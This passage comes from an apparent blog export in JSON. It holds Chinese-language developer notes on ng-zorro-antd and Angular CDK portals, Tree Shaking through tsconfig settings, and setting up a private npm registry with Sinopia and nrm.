[https://github.com/laopo001/vscode-extension-ngx]","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-09-08T08:44:11.000Z","created_by":"1","updated_at":"2017-09-08T09:02:25.000Z","updated_by":"1","published_at":"2017-09-08T08:46:58.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d33a","uuid":"8d66f03a-a6de-454f-a6f5-eee51e2e348d","title":"ng-zorro-antd学习1","slug":"untitled-4","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"ng-zorro-antd项目使用`Angular CLI`构建，测试项目。所它的工程结构是\\n\\n## tslint\\n\\nAngular是使用codelyzer扩展了tslint。可以对Angular项目进行更好的统一风格。如下，规定组件selector前缀。[更多规则](http://codelyzer.com/rules/)。\\n\\n```typescript\\n    \\\"directive-selector\\\": [\\n      true,\\n      \\\"attribute\\\",\\n      \\\"nz\\\",\\n      [\\\"camelCase\\\",\\\"kebab-case\\\"]\\n\\n    ],\\n    \\\"component-selector\\\": [\\n      true,\\n      [\\n        \\\"element\\\",\\n        \\\"attribute\\\"\\n      ],\\n      [\\n        \\\"nz\\\",\\n        \\\"app\\\"\\n      ],\\n      \\\"kebab-case\\\"\\n    ],\\n```\\n\\n还有在指定文件头，一般注明所有权，以及作者。如下：\\n\\n```typescript\\n\\\"file-header\\\": [true, \\\"Copyright Google Inc\\\\\\\\.\\\"],\\n/**\\n * @license\\n * Copyright Google Inc. All Rights Reserved.\\n */\\n```\\n\\n## test\\n\\n作为一个开源项目，测试是必须。Angular项目默认有两个测试，单元测试，端到端测试。\\n\\n* 单元测试（unit tests）\\n\\n使用jasmine+[Karma](http://karma-runner.github.io/0.13/index.html) ，命令`ng test`\\n\\n* 端到端测试（end-to-end tests）\\n\\n使用[Protractor](https://angular.github.io/protractor/) ，命令`ng e2e`。\\n\\n## exportAs\\n\\n`exportAs`在模板中方便访问该指令或组件的实例。\\n\\n```typescript\\nimport {Component,Directive} from 'angular2/core';\\n\\n@Directive({\\n    selector:'[kittencup]',\\n    exportAs:'kp'\\n})\\nclass Kittencup{\\n    url:string = 'http://kittencup.com'\\n}\\n\\n@Component({\\n    selector: 'App',\\n    directives: [Kittencup],\\n    template: `\\n        <h1 kittencup #kpInstance=\\\"kp\\\">\\n            <span (click)=\\\"clickHandle(kpInstance)\\\">{{kpInstance.url}}</span>\\n        </h1>\\n    `\\n})\\nexport class App {\\n\\n    clickHandle(kpInstance:Kittencup){\\n        console.log(kpInstance);\\n    }\\n}\\n```\\n\\n## @Angular/cdk\\n\\n `ng-zorro-antd`项目的覆盖，弹出之类组件是用的`Angular Material` 的`overlay`组件，这是Angular团队官方写的组件库，他们是使用`@Angular/cdk` 的[portal](https://github.com/angular/material2/blob/master/src/cdk/portal/portal.md)解决弹出的问题。\\n![](/content/images/2017/09/QQ--20170911152353.png)\\n\\n现在body下建立一个弹出层的容器，使用`DomPortalHost`添加template或者Component。\\n## 全局CSS引入\\n`ng-zorro-antd`使用一个root组件。它是是一个空组件，只有css。然后设置组件css全局渲染，只需引入这个组件，就引入了全局CSS。这样解决了发布时还要发布CSS。\\n\\n\\n\\n\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>ng-zorro-antd项目使用<code>Angular CLI</code>构建，测试项目。所它的工程结构是</p>\n<h2 id=\"tslint\">tslint</h2>\n<p>Angular是使用codelyzer扩展了tslint。可以对Angular项目进行更好的统一风格。如下，规定组件selector前缀。<a href=\"http://codelyzer.com/rules/\">更多规则</a>。</p>\n<pre><code class=\"language-typescript\">    &quot;directive-selector&quot;: [\n      true,\n      &quot;attribute&quot;,\n      &quot;nz&quot;,\n      [&quot;camelCase&quot;,&quot;kebab-case&quot;]\n\n    ],\n    &quot;component-selector&quot;: [\n      true,\n      [\n        &quot;element&quot;,\n        &quot;attribute&quot;\n      ],\n      [\n        &quot;nz&quot;,\n        &quot;app&quot;\n      ],\n      &quot;kebab-case&quot;\n    ],\n</code></pre>\n<p>还有在指定文件头，一般注明所有权，以及作者。如下：</p>\n<pre><code class=\"language-typescript\">&quot;file-header&quot;: [true, &quot;Copyright Google Inc\\\\.&quot;],\n/**\n * @license\n * Copyright Google Inc. All Rights Reserved.\n */\n</code></pre>\n<h2 id=\"test\">test</h2>\n<p>作为一个开源项目，测试是必须。Angular项目默认有两个测试，单元测试，端到端测试。</p>\n<ul>\n<li>单元测试（unit tests）</li>\n</ul>\n<p>使用jasmine+<a href=\"http://karma-runner.github.io/0.13/index.html\">Karma</a> ，命令<code>ng test</code></p>\n<ul>\n<li>端到端测试（end-to-end tests）</li>\n</ul>\n<p>使用<a href=\"https://angular.github.io/protractor/\">Protractor</a> ，命令<code>ng e2e</code>。</p>\n<h2 id=\"exportas\">exportAs</h2>\n<p><code>exportAs</code>在模板中方便访问该指令或组件的实例。</p>\n<pre><code class=\"language-typescript\">import {Component,Directive} from 'angular2/core';\n\n@Directive({\n    selector:'[kittencup]',\n    exportAs:'kp'\n})\nclass Kittencup{\n    url:string = 'http://kittencup.com'\n}\n\n@Component({\n    selector: 'App',\n    directives: [Kittencup],\n    template: `\n        &lt;h1 kittencup #kpInstance=&quot;kp&quot;&gt;\n            &lt;span (click)=&quot;clickHandle(kpInstance)&quot;&gt;{{kpInstance.url}}&lt;/span&gt;\n        &lt;/h1&gt;\n    `\n})\nexport class App {\n\n    clickHandle(kpInstance:Kittencup){\n        console.log(kpInstance);\n    }\n}\n</code></pre>\n<h2 id=\"angularcdk\">@Angular/cdk</h2>\n<p><code>ng-zorro-antd</code>项目的覆盖，弹出之类组件是用的<code>Angular Material</code> 的<code>overlay</code>组件，这是Angular团队官方写的组件库，他们是使用<code>@Angular/cdk</code> 的<a href=\"https://github.com/angular/material2/blob/master/src/cdk/portal/portal.md\">portal</a>解决弹出的问题。<br>\n<img src=\"/content/images/2017/09/QQ--20170911152353.png\" alt=\"\"></p>\n<p>现在body下建立一个弹出层的容器，使用<code>DomPortalHost</code>添加template或者Component。</p>\n<h2 id=\"css\">全局CSS引入</h2>\n<p><code>ng-zorro-antd</code>使用一个root组件。它是是一个空组件，只有css。然后设置组件css全局渲染，只需引入这个组件，就引入了全局CSS。这样解决了发布时还要发布CSS。</p>\n<!--kg-card-end: markdown-->","comment_id":"126","plaintext":"ng-zorro-antd项目使用Angular CLI构建，测试项目。所它的工程结构是\n\ntslint\nAngular是使用codelyzer扩展了tslint。可以对Angular项目进行更好的统一风格。如下，规定组件selector前缀。更多规则\n[http://codelyzer.com/rules/]。\n\n    \"directive-selector\": [\n      true,\n      \"attribute\",\n      \"nz\",\n      [\"camelCase\",\"kebab-case\"]\n\n    ],\n    \"component-selector\": [\n      true,\n      [\n        \"element\",\n        \"attribute\"\n      ],\n      [\n        \"nz\",\n        \"app\"\n      ],\n      \"kebab-case\"\n    ],\n\n\n还有在指定文件头，一般注明所有权，以及作者。如下：\n\n\"file-header\": [true, \"Copyright Google Inc\\\\.\"],\n/**\n * @license\n * Copyright Google Inc. All Rights Reserved.\n */\n\n\ntest\n作为一个开源项目，测试是必须。Angular项目默认有两个测试，单元测试，端到端测试。\n\n * 单元测试（unit tests）\n\n使用jasmine+Karma [http://karma-runner.github.io/0.13/index.html] ，命令ng test\n\n * 端到端测试（end-to-end tests）\n\n使用Protractor [https://angular.github.io/protractor/] ，命令ng e2e。\n\nexportAs\nexportAs在模板中方便访问该指令或组件的实例。\n\nimport {Component,Directive} from 'angular2/core';\n\n@Directive({\n    selector:'[kittencup]',\n    exportAs:'kp'\n})\nclass Kittencup{\n    url:string = 'http://kittencup.com'\n}\n\n@Component({\n    selector: 'App',\n    directives: [Kittencup],\n    template: `\n        <h1 kittencup #kpInstance=\"kp\">\n            <span (click)=\"clickHandle(kpInstance)\">{{kpInstance.url}}</span>\n        </h1>\n    `\n})\nexport class App {\n\n    clickHandle(kpInstance:Kittencup){\n        console.log(kpInstance);\n    }\n}\n\n\n@Angular/cdk\nng-zorro-antd项目的覆盖，弹出之类组件是用的Angular Material 的overlay组件，这是Angular团队官方写的组件库，他们是使用\n@Angular/cdk 的portal\n[https://github.com/angular/material2/blob/master/src/cdk/portal/portal.md]\n解决弹出的问题。\n\n\n现在body下建立一个弹出层的容器，使用DomPortalHost添加template或者Component。\n\n全局CSS引入\nng-zorro-antd\n使用一个root组件。它是是一个空组件，只有css。然后设置组件css全局渲染，只需引入这个组件，就引入了全局CSS。这样解决了发布时还要发布CSS。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-09-15T08:50:21.000Z","created_by":"1","updated_at":"2017-09-15T09:10:59.000Z","updated_by":"1","published_at":"2017-09-15T09:10:56.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d33b","uuid":"dc8fa0dd-5080-455e-b7ce-6779c23b6c9a","title":"Tree Shaking","slug":"tree-shaking","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"## Tree Shaking\\n\\n### 使用\\n\\n修改 `tsconfig.json`文件，compilerOptions.module,从commonjs，改成es2015。我们的代码编译成js的时候就使用es2015模块规范。然后使用webpack2以上，自带UglifyJsPlugin插件压缩就会，自动Tree Shaking。这是我们的代码在编译到es5的时候会保持es2015模块规范。\\n\\n```json\\n{\\n  \\\"compilerOptions\\\": {\\n    \\\"target\\\": \\\"es5\\\",\\n    \\\"module\\\": \\\"es2015\\\",\\n   }\\n}\\n```\\n\\n### 其他\\n\\n但是这只是`Tree Shaking`自己的代码，一般减少不了很多体积，一个工程主要是npm包占了大量体积。而npm包，一般为了兼容，都会转成es5在发布。es5自然不是es2015模块规范了。虽然typescript可以输出es5代码，模块规范保持es2015的怪异代码。但是现阶段大量的npm库都不是es2015规范。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><h2 id=\"treeshaking\">Tree Shaking</h2>\n<h3 id=\"\">使用</h3>\n<p>修改 <code>tsconfig.json</code>文件，compilerOptions.module,从commonjs，改成es2015。我们的代码编译成js的时候就使用es2015模块规范。然后使用webpack2以上，自带UglifyJsPlugin插件压缩就会，自动Tree Shaking。这是我们的代码在编译到es5的时候会保持es2015模块规范。</p>\n<pre><code class=\"language-json\">{\n  &quot;compilerOptions&quot;: {\n    &quot;target&quot;: &quot;es5&quot;,\n    &quot;module&quot;: &quot;es2015&quot;,\n   }\n}\n</code></pre>\n<h3 id=\"\">其他</h3>\n<p>但是这只是<code>Tree Shaking</code>自己的代码，一般减少不了很多体积，一个工程主要是npm包占了大量体积。而npm包，一般为了兼容，都会转成es5在发布。es5自然不是es2015模块规范了。虽然typescript可以输出es5代码，模块规范保持es2015的怪异代码。但是现阶段大量的npm库都不是es2015规范。</p>\n<!--kg-card-end: markdown-->","comment_id":"127","plaintext":"Tree Shaking\n使用\n修改 tsconfig.json\n文件，compilerOptions.module,从commonjs，改成es2015。我们的代码编译成js的时候就使用es2015模块规范。然后使用webpack2以上，自带UglifyJsPlugin插件压缩就会，自动Tree\nShaking。这是我们的代码在编译到es5的时候会保持es2015模块规范。\n\n{\n  \"compilerOptions\": {\n    \"target\": \"es5\",\n    \"module\": \"es2015\",\n   }\n}\n\n\n其他\n但是这只是Tree Shaking\n自己的代码，一般减少不了很多体积，一个工程主要是npm包占了大量体积。而npm包，一般为了兼容，都会转成es5在发布。es5自然不是es2015模块规范了。虽然typescript可以输出es5代码，模块规范保持es2015的怪异代码。但是现阶段大量的npm库都不是es2015规范。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-09-15T09:13:30.000Z","created_by":"1","updated_at":"2017-09-21T03:26:12.000Z","updated_by":"1","published_at":"2017-09-21T03:26:12.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d33c","uuid":"8687892e-73aa-477f-b280-e536b520d397","title":"@angular/cdk/portal实现","slug":"angular-cdk-portal","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"#### Portal<C>和PortalHost\\n这些是angular封装好的动态渲染的工具。PortalHost可以看成一个容器，Portal是需要动态渲染的`（如模板或组件）`。PortalHost和Portal是一对一关系，每个PortalHost只能插入一个Portal。\\n\\nPortalHost\\n\\n* `attach(portal: Portal<any>)`  PortalHost绑定Portal<C>\\n* `detach(): void` 取消绑定\\n* `dispose(): void` 销毁\\n* `hasAttached(): boolean` 是否已经绑定\\n\\nPortal<C>有个两个实现TemplatePortal<C>和ComponentPortal<T>\\n\\n* `attach(PortalHost): Promise<T>` 绑定\\n* `detach(): Promise<void>` 取消绑定\\n* `isAttached: boolean` 是否已经绑定\\n\\n#### 实现\\nportal最终都是通过viewContainerRef的createComponent和createEmbeddedView动态创建的。\\n\\n* createEmbeddedView类型如下，必须的参数只有一个TemplateRef<C>,返回值是ViewRef<C>类型,要使它立即显示执行`ViewRef.detectChanges()`,使用后要记得执行`viewContainer.remove(viewContainer.indexOf(viewRef));`销毁。\\n```\\ncreateEmbeddedView<C>(templateRef: TemplateRef<C>, context?: C, index?: number): EmbeddedViewRef<C>;\\n```\\n* createComponent类型如下，必须的参数只有一个ComponentFactory<C>。返回值是componentRef，不使用了要记得执行`componentRef.destroy()`销毁。\\nindex是插入的位置，injector是注入器，projectableNodes要是插入到组件<ng-content>中viewRef的rootNodes节点。\\n```\\ncreateComponent<C>(componentFactory: ComponentFactory<C>, index?: number, injector?: Injector, projectableNodes?: any[][], ngModule?: NgModuleRef<any>): ComponentRef<C>;\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><h4 id=\"portalcportalhost\">Portal<C>和PortalHost</h4>\n<p>这些是angular封装好的动态渲染的工具。PortalHost可以看成一个容器，Portal是需要动态渲染的<code>（如模板或组件）</code>。PortalHost和Portal是一对一关系，每个PortalHost只能插入一个Portal。</p>\n<p>PortalHost</p>\n<ul>\n<li><code>attach(portal: Portal&lt;any&gt;)</code>  PortalHost绑定Portal<C></li>\n<li><code>detach(): void</code> 取消绑定</li>\n<li><code>dispose(): void</code> 销毁</li>\n<li><code>hasAttached(): boolean</code> 是否已经绑定</li>\n</ul>\n<p>Portal<C>有个两个实现TemplatePortal<C>和ComponentPortal<T></p>\n<ul>\n<li><code>attach(PortalHost): Promise&lt;T&gt;</code> 绑定</li>\n<li><code>detach(): Promise&lt;void&gt;</code> 取消绑定</li>\n<li><code>isAttached: boolean</code> 是否已经绑定</li>\n</ul>\n<h4 id=\"\">实现</h4>\n<p>portal最终都是通过viewContainerRef的createComponent和createEmbeddedView动态创建的。</p>\n<ul>\n<li>createEmbeddedView类型如下，必须的参数只有一个TemplateRef<C>,返回值是ViewRef<C>类型,要使它立即显示执行<code>ViewRef.detectChanges()</code>,使用后要记得执行<code>viewContainer.remove(viewContainer.indexOf(viewRef));</code>销毁。</li>\n</ul>\n<pre><code>createEmbeddedView&lt;C&gt;(templateRef: TemplateRef&lt;C&gt;, context?: C, index?: number): EmbeddedViewRef&lt;C&gt;;\n</code></pre>\n<ul>\n<li>createComponent类型如下，必须的参数只有一个ComponentFactory<C>。返回值是componentRef，不使用了要记得执行<code>componentRef.destroy()</code>销毁。<br>\nindex是插入的位置，injector是注入器，projectableNodes要是插入到组件<ng-content>中viewRef的rootNodes节点。</li>\n</ul>\n<pre><code>createComponent&lt;C&gt;(componentFactory: ComponentFactory&lt;C&gt;, index?: number, injector?: Injector, projectableNodes?: any[][], ngModule?: NgModuleRef&lt;any&gt;): ComponentRef&lt;C&gt;;\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"128","plaintext":"Portal和PortalHost\n这些是angular封装好的动态渲染的工具。PortalHost可以看成一个容器，Portal是需要动态渲染的（如模板或组件）\n。PortalHost和Portal是一对一关系，每个PortalHost只能插入一个Portal。\n\nPortalHost\n\n * attach(portal: Portal<any>) PortalHost绑定Portal\n * detach(): void 取消绑定\n * dispose(): void 销毁\n * hasAttached(): boolean 是否已经绑定\n\nPortal有个两个实现TemplatePortal和ComponentPortal\n\n * attach(PortalHost): Promise<T> 绑定\n * detach(): Promise<void> 取消绑定\n * isAttached: boolean 是否已经绑定\n\n实现\nportal最终都是通过viewContainerRef的createComponent和createEmbeddedView动态创建的。\n\n * createEmbeddedView类型如下，必须的参数只有一个TemplateRef,返回值是ViewRef类型,要使它立即显示执行\n   ViewRef.detectChanges(),使用后要记得执行\n   viewContainer.remove(viewContainer.indexOf(viewRef));销毁。\n\ncreateEmbeddedView<C>(templateRef: TemplateRef<C>, context?: C, index?: number): EmbeddedViewRef<C>;\n\n\n * createComponent类型如下，必须的参数只有一个ComponentFactory。返回值是componentRef，不使用了要记得执行\n   componentRef.destroy()销毁。\n   index是插入的位置，injector是注入器，projectableNodes要是插入到组件中viewRef的rootNodes节点。\n\ncreateComponent<C>(componentFactory: ComponentFactory<C>, index?: number, injector?: Injector, projectableNodes?: any[][], ngModule?: NgModuleRef<any>): ComponentRef<C>;","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-09-21T03:30:37.000Z","created_by":"1","updated_at":"2017-09-21T11:43:03.000Z","updated_by":"1","published_at":"2017-09-21T11:43:03.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d33d","uuid":"3c242885-dab4-4e67-9670-55541ca973e8","title":"搭建私有npm仓库","slug":"da-jian-si-you-npmcang-ku","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"这里使用 [Sinopia](https://github.com/rlidwka/sinopia) 搭建npm仓库。只需两句代码即可搭建成功。\\n\\nsinopia有以下几个优势：\\n\\n1. 不同步拉取npm库，占据大量硬盘，没有硬盘被撑爆的问题；\\n2. 安装配置极其简单,不需要数据库；\\n3. 支持配置上游registry配置，一次拉取即缓存；\\n4. 直接可以拉取docker镜像；\\n\\n### 安装\\n\\n```shell\\n$ npm install -g sinopia\\n$ sinopia\\n```\\n\\ncurl http://localhost:4873/，没有timeout。这时已经搭好了。不过只能本地访问，可以直接修改config.yaml配置文件，最后一行listen: 0.0.0.0:4873。不过推荐nginx反向代理到80。当然还可以通过docker搭建，也很简单。\\n使用pm2守护进程 \\n```shell\\npm2 start `which sinopia`\\n```\\n#### config.yaml配置文件\\n在`~/.config/sinopia/`目录。\\n```yaml\\n# path to a directory with all packages\\nstorage: ./storage  //npm包存放的路径\\n\\nauth:\\n  htpasswd:\\n    file: ./htpasswd   //保存用户的账号密码等信息\\n    # Maximum amount of users allowed to register, defaults to \\\"+inf\\\".\\n    # You can set this to -1 to disable registration.\\n    max_users: -1  //默认为1000，改为-1，禁止注册\\n\\n# a list of other known repositories we can talk to\\nuplinks:\\n  npmjs:\\n    url: http://registry.npm.taobao.org/  //默认为npm的官网，由于国情，修改 url 让sinopia使用 淘宝的npm镜像地址\\n    \\npackages:  //配置权限管理\\n  '@*/*':\\n    # scoped packages\\n    access: $all\\n    publish: $authenticated\\n\\n  '*':\\n    # allow all users (including non-authenticated users) to read and\\n    # publish all packages\\n    #\\n    # you can specify usernames/groupnames (depending on your auth plugin)\\n    # and three keywords: \\\"$all\\\", \\\"$anonymous\\\", \\\"$authenticated\\\"\\n    access: $all\\n\\n    # allow all known users to publish packages\\n    # (anyone can register by default, remember?)\\n    publish: $authenticated\\n\\n    # if package is not available locally, proxy requests to 'npmjs' registry\\n    proxy: npmjs\\n\\n# log settings\\nlogs:\\n  - {type: stdout, format: pretty, level: http}\\n  #- {type: file, path: sinopia.log, level: info}\\n\\n# you can specify listen address (or simply a port) \\nlisten: 0.0.0.0:4873  ////默认没有，只能在本机访问，添加后可以通过外网访问。\\n```\\n\\n### 客户端使用\\n\\n#### 安装nrm\\n\\n```shell\\n$ npm install -g nrm # 安装nrm\\n$ nrm add XXXXX http://XXXXXX:4873 # 添加本地的npm镜像地址\\n$ nrm use XXXX # 使用本址的镜像地址\\n```\\n\\n```shell\\nldh@ldh-PC:~/GitHubs/aa$ nrm ls\\n\\n  npm ---- https://registry.npmjs.org/\\n  cnpm --- http://r.cnpmjs.org/\\n  taobao - https://registry.npm.taobao.org/\\n  nj ----- https://registry.nodejitsu.com/\\n  rednpm - http://registry.mirror.cqupt.edu.cn/\\n  npmMirror  https://skimdb.npmjs.com/registry/\\n  edunpm - http://registry.enpmjs.org/\\n* lnpm --- http://npm.dadigua.win/\\n\\n```\\n\\n已经直接使用私有仓库就行了。如果找不到库，会自动到上游仓库去拉的。然后`npm adduser`、`npm login`、`npm publish` 等命令sinopia搭建的npm库都是支持的。\\n\\n如下是Sinopia搭建npm库的首页。publish了一个库测试了下。\\n![](/content/images/2017/09/QQ--20170911152353-1.png)\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>这里使用 <a href=\"https://github.com/rlidwka/sinopia\">Sinopia</a> 搭建npm仓库。只需两句代码即可搭建成功。</p>\n<p>sinopia有以下几个优势：</p>\n<ol>\n<li>不同步拉取npm库，占据大量硬盘，没有硬盘被撑爆的问题；</li>\n<li>安装配置极其简单,不需要数据库；</li>\n<li>支持配置上游registry配置，一次拉取即缓存；</li>\n<li>直接可以拉取docker镜像；</li>\n</ol>\n<h3 id=\"\">安装</h3>\n<pre><code class=\"language-shell\">$ npm install -g sinopia\n$ sinopia\n</code></pre>\n<p>curl <a href=\"http://localhost:4873/%EF%BC%8C%E6%B2%A1%E6%9C%89timeout%E3%80%82%E8%BF%99%E6%97%B6%E5%B7%B2%E7%BB%8F%E6%90%AD%E5%A5%BD%E4%BA%86%E3%80%82%E4%B8%8D%E8%BF%87%E5%8F%AA%E8%83%BD%E6%9C%AC%E5%9C%B0%E8%AE%BF%E9%97%AE%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E4%BF%AE%E6%94%B9config.yaml%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%8C%E6%9C%80%E5%90%8E%E4%B8%80%E8%A1%8Clisten:\">http://localhost:4873/，没有timeout。这时已经搭好了。不过只能本地访问，可以直接修改config.yaml配置文件，最后一行listen:</a> 0.0.0.0:4873。不过推荐nginx反向代理到80。当然还可以通过docker搭建，也很简单。<br>\n使用pm2守护进程</p>\n<pre><code class=\"language-shell\">pm2 start `which sinopia`\n</code></pre>\n<h4 id=\"configyaml\">config.yaml配置文件</h4>\n<p>在<code>~/.config/sinopia/</code>目录。</p>\n<pre><code class=\"language-yaml\"># path to a directory with all packages\nstorage: ./storage  //npm包存放的路径\n\nauth:\n  htpasswd:\n    file: ./htpasswd   //保存用户的账号密码等信息\n    # Maximum amount of users allowed to register, defaults to &quot;+inf&quot;.\n    # You can set this to -1 to disable registration.\n    max_users: -1  //默认为1000，改为-1，禁止注册\n\n# a list of other known repositories we can talk to\nuplinks:\n  npmjs:\n    url: http://registry.npm.taobao.org/  //默认为npm的官网，由于国情，修改 url 让sinopia使用 淘宝的npm镜像地址\n    \npackages:  //配置权限管理\n  '@*/*':\n    # scoped packages\n    access: $all\n    publish: $authenticated\n\n  '*':\n    # allow all users (including non-authenticated users) to read and\n    # publish all packages\n    #\n    # you can specify usernames/groupnames (depending on your auth plugin)\n    # and three keywords: &quot;$all&quot;, &quot;$anonymous&quot;, &quot;$authenticated&quot;\n    access: $all\n\n    # allow all known users to publish packages\n    # (anyone can register by default, remember?)\n    publish: $authenticated\n\n    # if package is not available locally, proxy requests to 'npmjs' registry\n    proxy: npmjs\n\n# log settings\nlogs:\n  - {type: stdout, format: pretty, level: http}\n  #- {type: file, path: sinopia.log, level: info}\n\n# you can specify listen address (or simply a port) \nlisten: 0.0.0.0:4873  ////默认没有，只能在本机访问，添加后可以通过外网访问。\n</code></pre>\n<h3 id=\"\">客户端使用</h3>\n<h4 id=\"nrm\">安装nrm</h4>\n<pre><code class=\"language-shell\">$ npm install -g nrm # 安装nrm\n$ nrm add XXXXX http://XXXXXX:4873 # 添加本地的npm镜像地址\n$ nrm use XXXX # 使用本址的镜像地址\n</code></pre>\n<pre><code class=\"language-shell\">ldh@ldh-PC:~/GitHubs/aa$ nrm ls\n\n  npm ---- https://registry.npmjs.org/\n  cnpm --- http://r.cnpmjs.org/\n  taobao - https://registry.npm.taobao.org/\n  nj ----- https://registry.nodejitsu.com/\n  rednpm - http://registry.mirror.cqupt.edu.cn/\n  npmMirror  https://skimdb.npmjs.com/registry/\n  edunpm - http://registry.enpmjs.org/\n* lnpm --- http://npm.dadigua.win/\n\n</code></pre>\n<p>已经直接使用私有仓库就行了。如果找不到库，会自动到上游仓库去拉的。然后<code>npm adduser</code>、<code>npm login</code>、<code>npm publish</code> 等命令sinopia搭建的npm库都是支持的。</p>\n<p>如下是Sinopia搭建npm库的首页。publish了一个库测试了下。<br>\n<img src=\"/content/images/2017/09/QQ--20170911152353-1.png\" alt=\"\"></p>\n<!--kg-card-end: markdown-->","comment_id":"129","plaintext":"这里使用 Sinopia [https://github.com/rlidwka/sinopia] 搭建npm仓库。只需两句代码即可搭建成功。\n\nsinopia有以下几个优势：\n\n 1. 不同步拉取npm库，占据大量硬盘，没有硬盘被撑爆的问题；\n 2. 安装配置极其简单,不需要数据库；\n 3. 支持配置上游registry配置，一次拉取即缓存；\n 4. 直接可以拉取docker镜像；\n\n安装\n$ npm install -g sinopia\n$ sinopia\n\n\ncurl \nhttp://localhost:4873/，没有timeout。这时已经搭好了。不过只能本地访问，可以直接修改config.yaml配置文件，最后一行listen:\n[http://localhost:4873/%EF%BC%8C%E6%B2%A1%E6%9C%89timeout%E3%80%82%E8%BF%99%E6%97%B6%E5%B7%B2%E7%BB%8F%E6%90%AD%E5%A5%BD%E4%BA%86%E3%80%82%E4%B8%8D%E8%BF%87%E5%8F%AA%E8%83%BD%E6%9C%AC%E5%9C%B0%E8%AE%BF%E9%97%AE%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E4%BF%AE%E6%94%B9config.yaml%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%8C%E6%9C%80%E5%90%8E%E4%B8%80%E8%A1%8Clisten:] \n0.0.0.0:4873。不过推荐nginx反向代理到80。当然还可以通过docker搭建，也很简单。\n使用pm2守护进程\n\npm2 start `which sinopia`\n\n\nconfig.yaml配置文件\n在~/.config/sinopia/目录。\n\n# path to a directory with all packages\nstorage: ./storage  //npm包存放的路径\n\nauth:\n  htpasswd:\n    file: ./htpasswd   //保存用户的账号密码等信息\n    # Maximum amount of users allowed to register, defaults to \"+inf\".\n    # You can set this to -1 to disable registration.\n    max_users: -1  //默认为1000，改为-1，禁止注册\n\n# a list of other known repositories we can talk to\nuplinks:\n  npmjs:\n    url: http://registry.npm.taobao.org/  //默认为npm的官网，由于国情，修改 url 让sinopia使用 淘宝的npm镜像地址\n    \npackages:  //配置权限管理\n  '@*/*':\n    # scoped packages\n    access: $all\n    publish: $authenticated\n\n  '*':\n    # allow all users (including non-authenticated users) to read and\n    # publish all packages\n    #\n    # you can specify usernames/groupnames (depending on your auth plugin)\n    # and three keywords: \"$all\", \"$anonymous\", \"$authenticated\"\n    access: $all\n\n    # allow all known users to publish packages\n    # (anyone can register by default, remember?)\n    publish: $authenticated\n\n    # if package is not available locally, proxy requests to 'npmjs' registry\n    proxy: npmjs\n\n# log settings\nlogs:\n  - {type: stdout, format: pretty, level: http}\n  #- {type: file, path: sinopia.log, level: info}\n\n# you can specify listen address (or simply a port) \nlisten: 0.0.0.0:4873  ////默认没有，只能在本机访问，添加后可以通过外网访问。\n\n\n客户端使用\n安装nrm\n$ npm install -g nrm # 安装nrm\n$ nrm add XXXXX http://XXXXXX:4873 # 添加本地的npm镜像地址\n$ nrm use XXXX # 使用本址的镜像地址\n\n\nldh@ldh-PC:~/GitHubs/aa$ nrm ls\n\n  npm ---- https://registry.npmjs.org/\n  cnpm --- http://r.cnpmjs.org/\n  taobao - https://registry.npm.taobao.org/\n  nj ----- https://registry.nodejitsu.com/\n  rednpm - http://registry.mirror.cqupt.edu.cn/\n  npmMirror  https://skimdb.npmjs.com/registry/\n  edunpm - http://registry.enpmjs.org/\n* lnpm --- http://npm.dadigua.win/\n\n\n\n已经直接使用私有仓库就行了。如果找不到库，会自动到上游仓库去拉的。然后npm adduser、npm login、npm publish 